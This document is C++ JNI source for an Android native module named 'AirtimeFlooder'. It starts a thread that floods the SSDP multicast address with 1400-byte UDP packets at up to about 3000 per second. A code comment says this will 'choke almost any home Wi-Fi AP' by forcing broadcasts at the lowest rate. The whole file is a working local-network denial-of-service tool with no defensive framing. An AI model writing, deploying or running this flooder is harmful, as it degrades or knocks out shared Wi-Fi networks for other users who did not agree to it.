#include <jni.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <thread>
#include <atomic>
#include <chrono>
#include <vector>
#include <string>
#include <cstring>
#include <android/log.h>

#define LOG_TAG "AxiomAirtime"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)

std::atomic<bool> g_flooder_running{false};

void flood_thread(int intensity) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) { LOGI("Socket creation failed"); return; }

    // Target SSDP Multicast Address (Forces AP to broadcast at lowest basic rate)
    struct sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(1900);
    inet_pton(AF_INET, "239.255.255.250", &dest_addr.sin_addr);

    // Keep traffic strictly on local LAN
    int ttl =2;
    setsockopt(sock, IPPROTO_IP, IP_MULTICAST_TTL, &ttl, sizeof(ttl));

    const size_t PAYLOAD_SIZE = 1400;
    std::vector<char> payload(PAYLOAD_SIZE, 'A');

    // Map intensity (1-100) to packets per second (100 to 3000 pps)
    // 3000 pps of 1400-byte multicast frames will choke almost any home Wi-Fi AP
    int target_pps = 100 + (intensity * 29); 
    double delay_us = 1000000.0 / target_pps;

    LOGI("Airtime Flooder Active: Intensity %d (~%d pps)", intensity, target_pps);

    auto next_send = std::chrono::steady_clock::now();

    while (g_flooder_running.load(std::memory_order_relaxed)) {
        sendto(sock, payload.data(), payload.size(), 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
        
        next_send += std::chrono::microseconds(static_cast<long long>(delay_us));
        auto now = std::chrono::steady_clock::now();
        if (next_send > now) {
            std::this_thread::sleep_until(next_send);
        } else {
            next_send = now;
        }
    }
    close(sock);
    LOGI("Airtime Flooder terminated.");
}

extern "C" JNIEXPORT void JNICALL
Java_com_axiom_shaper_AirtimeFlooder_nativeStart(JNIEnv* env, jobject, jint intensity) {
    if (g_flooder_running.load()) return;
    g_flooder_running.store(true, std::memory_order_relaxed);
    std::thread(flood_thread, intensity).detach();
}

extern "C" JNIEXPORT void JNICALL
Java_com_axiom_shaper_AirtimeFlooder_nativeStop(JNIEnv*, jobject) {
    g_flooder_running.store(false, std::memory_order_relaxed);
}
